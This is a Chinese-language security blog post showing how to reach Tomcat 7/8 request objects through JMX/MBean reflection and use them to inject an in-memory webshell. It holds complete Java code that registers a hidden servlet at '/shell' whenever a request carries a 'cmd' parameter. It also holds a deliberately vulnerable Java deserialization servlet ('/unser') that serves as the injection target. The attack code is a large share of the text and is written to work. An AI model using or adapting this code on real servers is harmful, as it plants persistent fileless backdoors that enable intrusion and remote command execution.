## 前言

前面主要是通过寻找一个全局存储的request / response来进行Tomcat中间下的回显，但是在tomcat
7环境下并不能够获取到`StandardContext`对象，这里李三师傅在前文的基础中发现了在`AbstractProtocol$ConnectionHandler#register`的调用中不仅像之前的思路一样将获取到的`RequestInfo`对象存放在了`global`属性中。

![image-20221104160336852.png](https://image.3001.net/images/20221218/1671363553_639efbe1d587336a79bcf.png!small)

同样通过调用`Registry.getRegistry((Object)null,
(Object)null).registerComponent`方法将`RequestInfo`对象进行组件的注册流程中。

## 正文

### 获取回显

紧跟上面，我们跟进这个`registerComponent`方法的调用。

![image-20221104160545681.png](https://image.3001.net/images/20221218/1671363564_639efbecd65f808cfe313.png!small)

对于传入的这个bean对象，首先通过他的类型获取了一个`ManagedBean`对象，调用其`createMBean`方法创建了一个MBean对象，最后调用了`registerMBean`进行该MBean的注册，跟进一下。

![image-20221104161651661.png](https://image.3001.net/images/20221218/1671363570_639efbf265107f1508866.png!small)

调用了`mbsInterceptor`属性的`registerMBean`方法进行注册，这里的`mbsInterceptor`属性即是`DefaultMBeanServerInterceptor`对象，跟进一下。

![image-20221104161846862.png](https://image.3001.net/images/20221218/1671363576_639efbf8e4fcd0b3da77a.png!small)

在这个方法调用了该类的`registerObject`方法进行注册，

![image-20221104161941654.png](https://image.3001.net/images/20221218/1671363588_639efc043ee6e37cce637.png!small)

在这个方法中，调用了`Introspector#makeDynamicMBean`方法创建了一个动态的MBean，之后调用了`registerDynamicMBean`方法进行动态MBean的注册。

![image-20221104162502837.png](https://image.3001.net/images/20221218/1671363594_639efc0a0130dccac1b69.png!small)

最后调用了`registerWithRepository`进行进一步的注册，

![image-20221104162538165.png](https://image.3001.net/images/20221218/1671363601_639efc1167d1f5a379d45.png!small)

在这个方法中，调用了该类的`repository`属性的`addMBean`方法进行`MBean`的添加。

![image-20221104163011422.png](https://image.3001.net/images/20221218/1671363607_639efc173d5b9e48f570f.png!small)

在这个方法的后面，首先会根据dom取出对应的信息，如果不存在，将会调用`addNewDomMoi`方法将这个Bean进行了添加

![image-20221104163220179.png](https://image.3001.net/images/20221218/1671363612_639efc1c7fc40a1d48018.png!small)

传入了一个map对象，其中包含有我们的requstInfo的信息，

我们之后通过idea的Evaluate来进行调试，

![image-20221104163429199.png](https://image.3001.net/images/20221218/1671363619_639efc23e67cb3ac48496.png!small)

这里的`Catelina`也就是和tomcat相关的组件信息，值得注意的是，如果使用springboot内置的tomcat启动服务，这里不再是`Catalina`而应该是`Tomcat`这个key值。

这里的value值就是我们在上面最后一步put进入的一个map对象，

![image-20221104163613671.png](https://image.3001.net/images/20221218/1671363630_639efc2eb8ca2ecef5e71.png!small)

有很多，其中一个是包含有我们需要的`request / response`对象的，

可以关注到下面这个key值，

![image-20221104163707896.png](https://image.3001.net/images/20221218/1671363636_639efc3458e9b76f27997.png!small)

其中的name字段的格式就是`protocol-nio-port`，这里我的环境是tomcat 8, 如果是tomcat
7环境这里的nio应该为bio才对。

在其value字段中的`NamedObject`对象中，

![image-20221104163913934.png](https://image.3001.net/images/20221218/1671363641_639efc39cf23e58212d11.png!small)

能够找到我们需要的`RequestInfo`对象。

所以总结一下我们获取request的流程大致为，

![image-20221104164046568.png](https://image.3001.net/images/20221218/1671363647_639efc3fa84f7a314a7df.png!small)

首先是通过反射一步一个获取到domainTb这个Map对象中key值为`Catalina`的value值，

![image-20221104164155539.png](https://image.3001.net/images/20221218/1671363660_639efc4c23fa638668df1.png!small)

之后从我们前面得到的value对象中获取到我们需要的RequestInfo类，进而获取到Request / Response对象。

### 构造回显内存马

基于上面的思路，我们可以通过以下代码获取回显，

    
    
    // 获取JmxMBeanServer对象
                MBeanServer mBeanServer = Registry.getRegistry((Object) null, (Object) null).getMBeanServer();
                // 反射获取JmxMBeanServer对象的mbsInterceptor属性值，也即是DefaultMBeanServerInterceptor对象
                Object mbsInterceptor = getField(mBeanServer, Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor"));
                // 获取DefaultMBeanServerInterceptor中的repository属性
                Object repository = getField(mbsInterceptor, Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository"));
                // 反射获取Repository对象的domainTb这个Map对象
                HashMap domainTb = (HashMap) getField(repository, Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb"));
                // 获取该HashMap中有关于Catalina这个hashMap对象进而获取到了GlobalRequestProcessor
                // 使用Tomcat启动服务
                Object namedObject = ((HashMap) domainTb.get("Catalina")).get("name=\"http-nio-8080\",type=GlobalRequestProcessor");
                // 使用Springboot启动服务
    //            Object namedObject = ((HashMap) domainTb.get("Tomcat")).get("name=\"http-nio-9999\",type=GlobalRequestProcessor");
                // 从获取的NamedObject对象中反射获取他的object属性
                Object object = getField(namedObject, Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object"));
                // object属性是一个BaseModelMBean对象，反射获取他的resource属性值
                Object resource = getField(object, Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource"));
                // resource属性是一个RequestGroupInfo对象，反射获取他的processors属性值
                ArrayList processors = (ArrayList) getField(resource, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                // 遍历前面得到的ArrayList列表，获取想要的请求
                for (Object processor : processors) {
                    // 强转为RequestInfo类型
                    RequestInfo requestInfo = (RequestInfo) processor;
                    // 反射获取对应的req属性
                    org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
    

在获取了`request`对象之后，我们理应筛选一下本次请求的Request是哪一个进而保证能够执行后续操作

完整代码为

    
    
    try {
                // 获取JmxMBeanServer对象
                MBeanServer mBeanServer = Registry.getRegistry((Object) null, (Object) null).getMBeanServer();
                // 反射获取JmxMBeanServer对象的mbsInterceptor属性值，也即是DefaultMBeanServerInterceptor对象
                Object mbsInterceptor = getField(mBeanServer, Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor"));
                // 获取DefaultMBeanServerInterceptor中的repository属性
                Object repository = getField(mbsInterceptor, Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository"));
                // 反射获取Repository对象的domainTb这个Map对象
                HashMap domainTb = (HashMap) getField(repository, Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb"));
                // 获取该HashMap中有关于Catalina这个hashMap对象进而获取到了GlobalRequestProcessor
                // 使用Tomcat启动服务
                Object namedObject = ((HashMap) domainTb.get("Catalina")).get("name=\"http-nio-8080\",type=GlobalRequestProcessor");
                // 使用Springboot启动服务
    //            Object namedObject = ((HashMap) domainTb.get("Tomcat")).get("name=\"http-nio-9999\",type=GlobalRequestProcessor");
                // 从获取的NamedObject对象中反射获取他的object属性
                Object object = getField(namedObject, Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object"));
                // object属性是一个BaseModelMBean对象，反射获取他的resource属性值
                Object resource = getField(object, Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource"));
                // resource属性是一个RequestGroupInfo对象，反射获取他的processors属性值
                ArrayList processors = (ArrayList) getField(resource, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                // 遍历前面得到的ArrayList列表，获取想要的请求
                for (Object processor : processors) {
                    // 强转为RequestInfo类型
                    RequestInfo requestInfo = (RequestInfo) processor;
                    // 反射获取对应的req属性
                    org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                    // 筛选请求
                    if (req.getParameters().getParameter("cmd") != null) {
                        // 将req对象转为org.apache.catalina.connector.Request对象进行内存马的注入
                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                        // 获取对应的ServletContext上下文环境
                        ServletContext servletContext = request.getServletContext();
                        // 注入Servlet内存马的步骤
                        String name = "RoboTerh";
                        if (servletContext.getServletRegistration(name) == null) {
                            StandardContext o = null;
    
                            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                            while (o == null) {
                                Field f = servletContext.getClass().getDeclaredField("context");
                                f.setAccessible(true);
                                Object obj = f.get(servletContext);
    
                                if (obj instanceof ServletContext) {
                                    servletContext = (ServletContext) obj;
                                } else if (obj instanceof StandardContext) {
                                    o = (StandardContext) obj;
                                }
                            }
    
                            //自定义servlet
                            Servlet servlet = new TomcatMemshell3();
    
                            //用Wrapper封装servlet
                            Wrapper newWrapper = o.createWrapper();
                            newWrapper.setName(name);
                            newWrapper.setLoadOnStartup(1);
                            newWrapper.setServlet(servlet);
    
                            //向children中添加Wrapper
                            o.addChild(newWrapper);
                            //添加servlet的映射
                            o.addServletMappingDecoded("/shell", name);
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
    
    

### 测试

因为之前的spring-boot 2.5.0内置的tomcat版本是9.x，不能够通过该种方式进行内存马的注入。

所以我这里环境就选用Tomcat 8的容器进行搭建，

其中的存在反序列化漏洞的Servlet为。

    
    
    package com.roboterh.web;
    
    import javax.servlet.ServletException;
    import javax.servlet.ServletInputStream;
    import javax.servlet.annotation.WebServlet;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    
    @WebServlet("/unser")
    public class ServletTest extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                java.io.InputStream inputStream = req.getInputStream();
                ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
                objectInputStream.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

启动服务之后发送序列化数据，

验证是否成功注入，

![image-20221104164949242.png](https://image.3001.net/images/20221218/1671363676_639efc5c95f75492ee5a7.png!small)

能够成功进行注入操作。

## Ref

https://xz.aliyun.com/t/7535

